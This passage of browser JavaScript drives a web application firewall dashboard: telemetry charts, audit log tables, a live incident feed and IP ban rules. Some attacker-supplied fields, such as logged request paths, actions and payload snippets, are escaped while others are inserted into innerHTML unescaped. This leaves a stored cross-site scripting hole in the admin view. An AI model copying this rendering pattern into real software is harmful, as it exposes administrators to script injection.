                    <pre style="background: var(--terminal-bg); border: 1px solid var(--accent-border); padding: 8px; border-radius: 6px; font-size: 0.72rem; color: var(--accent); max-height: 60px; overflow: auto; white-space: pre-wrap;">${data.normalized_payload || 'N/A'}</pre>
                </div>
            </div>
        `;

        // Instantly refresh telemetry
        pollTelemetry();
    } catch (err) {
        resultBox.innerHTML = `<div style="color: var(--danger); text-align: center; margin: auto;">Error — check console.</div>`;
    }
}

// ---- Live Threat Vectors & Targeted Endpoints ----
function renderThreatAnalytics(analytics) {
    if (!analytics) return;

    const badge = document.getElementById('threat-unique-badge');
    if (badge) {
        badge.innerHTML = `${analytics.unique_ips || 0} Client IPs`;
    }

    // 1. Top targeted paths
    const pathsList = document.getElementById('analytics-top-paths');
    if (pathsList) {
        const paths = analytics.top_paths || [];
        if (paths.length === 0) {
            pathsList.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 18px;">No targeted endpoints recorded yet.</div>`;
        } else {
            pathsList.innerHTML = paths.map(p => `
                <div class="analytics-path-row">
                    <span class="path-badge">${escapeHtml(p.path)}</span>
                    <span class="count-badge">${p.count} attacks</span>
                </div>
            `).join('');
        }
    }

    // 2. Top triggered rules
    const rulesList = document.getElementById('analytics-top-rules');
    if (rulesList) {
        const rules = analytics.top_rules || [];
        if (rules.length === 0) {
            rulesList.innerHTML = `<div style="color: var(--text-muted); font-size: 0.76rem;">No triggered rules recorded yet.</div>`;
        } else {
            rulesList.innerHTML = rules.map(r => `
                <div class="analytics-rule-item">
                    <strong style="font-family: var(--font-mono); color: var(--danger);">${r.rule_id}</strong>
                    <span>${r.count} blocks</span>
                </div>
            `).join('');
        }
    }

    // 3. Active client IPs
    const ipsList = document.getElementById('analytics-top-ips');
    if (ipsList) {
        const ips = analytics.top_ips || [];
        if (ips.length === 0) {
            ipsList.innerHTML = `<div style="color: var(--text-muted); font-size: 0.74rem;">No active clients recorded yet.</div>`;
        } else {
            ipsList.innerHTML = ips.map(i => `
                <div class="analytics-ip-chip">
                    <code>${i.ip}</code>
                    <span style="color: ${i.blocked > 0 ? 'var(--danger)' : 'var(--text-muted)'}; font-weight: 600;">(${i.total} reqs)</span>
                </div>
            `).join('');
        }
    }
}

// ---- Charts ----
function initCharts() {
    const c = getThemeColors();
    const trafficCanvas = document.getElementById('trafficChart');
    const threatCanvas = document.getElementById('threatCategoryChart');
    if (!trafficCanvas || !threatCanvas) return;

    trafficChartInstance = new Chart(trafficCanvas.getContext('2d'), {
        type: 'line',
        data: {
            labels: ['-60s', '-50s', '-40s', '-30s', '-20s', '-10s', 'Now'],
            datasets: [
                {
                    label: 'Clean',
                    data: [0, 0, 0, 0, 0, 0, 0],
                    borderColor: c.accent,
                    backgroundColor: c.accent + '14',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true,
                    pointRadius: 0,
                },
                {
                    label: 'Blocked',
                    data: [0, 0, 0, 0, 0, 0, 0],
                    borderColor: c.danger,
                    backgroundColor: c.danger + '14',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true,
                    pointRadius: 0,
                }
            ]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { labels: { color: c.legend, font: { size: 11 }, boxWidth: 12 } } },
            scales: {
                x: { grid: { color: c.grid }, ticks: { color: c.tick, font: { size: 10 } } },
                y: { grid: { color: c.grid }, ticks: { color: c.tick, font: { size: 10 } } }
            }
        }
    });

    threatChartInstance = new Chart(threatCanvas.getContext('2d'), {
        type: 'doughnut',
        data: {
            labels: ['OWASP Top 10', 'API Security', 'Bot Protection'],
            datasets: [{
                data: [15, 7, 6],
                backgroundColor: ['#0075FF', '#7928CA', '#01B574'],
                borderWidth: 2,
                borderColor: '#060B26',
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    position: 'bottom',
                    labels: { color: c.legend, font: { size: 11 }, boxWidth: 12, padding: 14 }
                }
            },
            cutout: '72%',
        }
    });
}

// ---- Telemetry & Counter Animations ----
function animateNumber(elementId, targetValue, duration = 1200, suffix = '') {
    const el = document.getElementById(elementId);
    if (!el) return;
    const endVal = parseFloat(targetValue) || 0;
    const isFloat = String(targetValue).includes('.');

    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
        el.textContent = (isFloat ? endVal.toFixed(2) : Math.round(endVal).toLocaleString()) + suffix;
        return;
    }

    if (endVal === 0) {
        el.textContent = '0' + suffix;
        return;
    }

    const startVal = 0;
    const startTime = performance.now();

    function frame(now) {
        const elapsed = now - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const ease = 1 - Math.pow(1 - progress, 3);
        const current = startVal + (endVal - startVal) * ease;
        el.textContent = (isFloat ? current.toFixed(2) : Math.round(current).toLocaleString()) + suffix;
        if (progress < 1) {
            requestAnimationFrame(frame);
        } else {
            el.textContent = (isFloat ? endVal.toFixed(2) : Math.round(endVal).toLocaleString()) + suffix;
        }
    }
    requestAnimationFrame(frame);
}

async function pollTelemetry() {
    try {
        const res = await authFetch('/api/stats');
        if (!res.ok) return;
        const stats = await res.json();

        if (isInitialTelemetryLoad) {
            isInitialTelemetryLoad = false;
            animateNumber('stat-total-requests', stats.total_requests);
            animateNumber('stat-blocked-attacks', stats.blocked_attacks);
            animateNumber('stat-challenged-requests', stats.challenged_requests || 0);
            animateNumber('stat-latency', stats.latency_ms || 0.38, 1200, ' ms');
        } else {
            document.getElementById('stat-total-requests').textContent = Number(stats.total_requests).toLocaleString();
            document.getElementById('stat-blocked-attacks').textContent = Number(stats.blocked_attacks).toLocaleString();
            document.getElementById('stat-challenged-requests').textContent = Number(stats.challenged_requests || 0).toLocaleString();
            document.getElementById('stat-latency').textContent = (stats.latency_ms || 0.38) + ' ms';
        }

        const pct = stats.total_requests > 0 ? ((stats.blocked_attacks / stats.total_requests) * 100).toFixed(1) : '0';
        document.getElementById('stat-block-pct').textContent = pct + '%';

        if (trafficChartInstance && stats.traffic) {
            trafficChartInstance.data.datasets[0].data = stats.traffic.clean;
            trafficChartInstance.data.datasets[1].data = stats.traffic.blocked;
            trafficChartInstance.update('none');
        }

        if (threatChartInstance && stats.categories) {
            threatChartInstance.data.datasets[0].data = [
                stats.categories['OWASP Top 10'] || 0,
                stats.categories['API Security'] || 0,
                stats.categories['Bot Protection'] || 0
            ];
            threatChartInstance.update('none');
        }

        if (stats.analytics) {
            renderThreatAnalytics(stats.analytics);
        }

        fetchRecentEvents();
    } catch (err) {}
}

async function fetchRecentEvents() {
    try {
        const res = await authFetch('/api/events');
        if (!res.ok) return;
        const events = await res.json();
        const feed = document.getElementById('live-incident-feed');
        if (!feed) return;

        if (!events || events.length === 0) {
            feed.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 40px;">No recent incidents</div>`;
            return;
        }

        feed.innerHTML = events.slice(0, 5).map(e => `
            <div style="display: flex; align-items: center; justify-content: space-between; background: var(--bg-input); border: 1px solid var(--border); padding: 8px 10px; border-radius: var(--radius-sm); font-size: 0.78rem;">
                <div style="display: flex; align-items: center; gap: 7px;">
                    <span class="badge ${e.blocked ? 'badge-red' : (e.action.includes('Challenged') ? 'badge-amber' : 'badge-green')}">${e.action}</span>
                    <code style="color: var(--accent); font-size: 0.72rem;">${e.client_ip}</code>
                    <span style="color: var(--text-muted); max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${e.path}</span>
                </div>
                <span style="font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-muted);">${e.timestamp.split(' ')[1] || e.timestamp}</span>
            </div>
        `).join('');
    } catch (err) { console.error(err); }
}

// ---- Audit Logs ----
async function fetchAuditLogs() {
    const query = document.getElementById('log-search-query').value;
    const threat = document.getElementById('log-threat-type').value;

    try {
        const res = await authFetch(`/api/logs?q=${encodeURIComponent(query)}&threat=${encodeURIComponent(threat)}`);
        if (!res.ok) return;
        const logs = await res.json();
        const tbody = document.getElementById('audit-log-body');

        if (!logs || logs.length === 0) {
            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted);">No logs found</td></tr>`;
            return;
        }

        tbody.innerHTML = logs.map(l => {
            const encoded = encodeURIComponent(JSON.stringify(l));
            const badgeClass = l.blocked ? 'badge-red' : (l.action.includes('Challenged') ? 'badge-amber' : 'badge-green');
            return `
                <tr>
                    <td style="font-family: var(--font-mono); font-size: 0.76rem;">${l.timestamp}</td>
                    <td><code>${l.client_ip}</code></td>
                    <td>${l.path}</td>
                    <td><span class="badge ${l.blocked ? 'badge-red' : 'badge-amber'}">${l.rule_id || '—'}</span></td>
                    <td><span class="badge ${badgeClass}">${l.action}</span></td>
                    <td>
                        <button class="btn btn-outline" style="padding: 2px 7px; font-size: 0.72rem;" onclick="inspectPayload('${encoded}')">
                            Inspect
                        </button>
                    </td>
                </tr>
            `;
        }).join('');
    } catch (err) { console.error(err); }
}

function inspectPayload(encodedJson) {
    try {
        const data = JSON.parse(decodeURIComponent(encodedJson));
        document.getElementById('modal-time').textContent = data.timestamp;
        document.getElementById('modal-ip').textContent = data.client_ip;
        document.getElementById('modal-path').textContent = data.path;
        document.getElementById('modal-rule').textContent = data.rule_id || '—';
        document.getElementById('modal-reason').textContent = data.reason;
        document.getElementById('modal-payload').textContent = data.payload_snippet || 'No payload captured';
        openModal('inspectModal');
    } catch (e) { console.error(e); }
}

function clearAuditLogs() {
    openModal('confirmClearModal');
}

async function executeClearLogs() {
    closeModal('confirmClearModal');
    try {
        const res = await authFetch('/api/logs/clear', { method: 'POST' });
        if (res.ok) {
            fetchAuditLogs();
            pollTelemetry();
            showToast('All security logs cleared');
        } else {
            showToast('Failed to clear logs');
        }
    } catch (err) {
        showToast('Error clearing logs');
    }
}

function exportLogsCsv() {
    window.location.href = '/api/export/csv';
}

// ---- System ----
async function fetchSystem() {
    try {
        const res = await authFetch('/api/system');
        if (!res.ok) return;
        const data = await res.json();
        document.getElementById('sys-cpu').textContent = data.cpu_percent + '%';
        document.getElementById('sys-ram').textContent = data.ram_used_mb + ' MB';
        document.getElementById('sys-uptime').textContent = data.uptime;
    } catch (err) { console.error(err); }
}

// ---- Access Control & IP Quarantine ----
async function fetchIPRules() {
    try {
        const res = await authFetch('/api/ip-rules');
        if (!res.ok) return;
        const rules = await res.json();

        // Calculate counts
        const quarantines = rules.filter(r => r.rule_type === 'quarantine').length;
        const blacklists = rules.filter(r => r.rule_type === 'blacklist').length;
        const whitelists = rules.filter(r => r.rule_type === 'whitelist').length;

        const qEl = document.getElementById('metric-quarantine-count');
        const bEl = document.getElementById('metric-blacklist-count');
        const wEl = document.getElementById('metric-whitelist-count');
        const badgeEl = document.getElementById('ip-rules-badge');

        if (qEl) qEl.textContent = quarantines;
        if (bEl) bEl.textContent = blacklists;
        if (wEl) wEl.textContent = whitelists;
        if (badgeEl) badgeEl.textContent = rules.length;

        const tbody = document.getElementById('ip-rules-tbody');
        if (!tbody) return;

        if (rules.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 18px;">No active IP access rules or quarantines.</td></tr>';
            return;
        }

        tbody.innerHTML = rules.map(r => {
            let badgeClass = 'badge-yellow';
            let label = 'Quarantine';
            if (r.rule_type === 'blacklist') {
                badgeClass = 'badge-red';
                label = 'Blacklist';
            } else if (r.rule_type === 'whitelist') {
                badgeClass = 'badge-green';
                label = 'Whitelist';
            }

            let ttlText = 'Permanent';
            if (r.remaining_seconds !== null && r.remaining_seconds !== undefined) {
                const mins = Math.floor(r.remaining_seconds / 60);
                const secs = r.remaining_seconds % 60;
                ttlText = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
            }

            return `
                <tr>
                    <td style="font-family: var(--font-mono); font-weight: 600; color: var(--accent);">${escapeHtml(r.cidr)}</td>
                    <td><span class="badge ${badgeClass}">${label}</span></td>
                    <td style="max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${escapeHtml(r.reason || '—')}</td>
                    <td style="font-family: var(--font-mono);">${ttlText}</td>
                    <td style="color: var(--text-muted); font-size: 0.8rem;">${new Date(r.created_at).toLocaleTimeString()}</td>
                    <td>
                        <button class="btn btn-outline" style="padding: 2px 8px; font-size: 0.75rem; color: var(--danger); border-color: rgba(239, 68, 68, 0.3);" onclick="deleteIPRule(${r.id})">
                            ${r.rule_type === 'quarantine' ? 'Unban' : 'Remove'}
                        </button>
                    </td>
                </tr>
            `;
        }).join('');
    } catch (err) {
        console.error('Error fetching IP rules:', err);
    }
}

function openAddIPRuleModal() {
    openModal('addIPRuleModal');
}

async function submitNewIPRule() {
    const cidr = document.getElementById('newRuleCidr').value.trim();
    const ruleType = document.getElementById('newRuleType').value;
    const durVal = document.getElementById('newRuleDuration').value;
    const reason = document.getElementById('newRuleReason').value.trim();

    if (!cidr) return;
    const duration_seconds = durVal === 'permanent' ? null : parseInt(durVal, 10);

    try {
        const res = await authFetch('/api/ip-rules', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                cidr: cidr,
                rule_type: ruleType,
                reason: reason,
                duration_seconds: duration_seconds,
            }),
        });

        if (res.ok) {
            closeModal('addIPRuleModal');
            document.getElementById('newRuleCidr').value = '';
            document.getElementById('newRuleReason').value = '';
            showToast(`Rule for ${cidr} added successfully`);
            fetchIPRules();
        } else {
            const err = await res.json();
            showToast(err.detail || 'Failed to add IP rule');
        }
    } catch (err) {
        showToast('Network error saving IP rule');
    }
}

async function deleteIPRule(ruleId) {
    try {
        const res = await authFetch('/api/ip-rules/' + ruleId, {
            method: 'DELETE',
        });
        if (res.ok) {
            showToast('Rule removed / IP unbanned');
            fetchIPRules();
        } else {
            showToast('Failed to delete rule');
        }
    } catch (err) {
        showToast('Error removing rule');
    }
}

// ---- Initialization ----
window.addEventListener('DOMContentLoaded', () => {
    restoreTheme();
    checkAuthStatus();
});
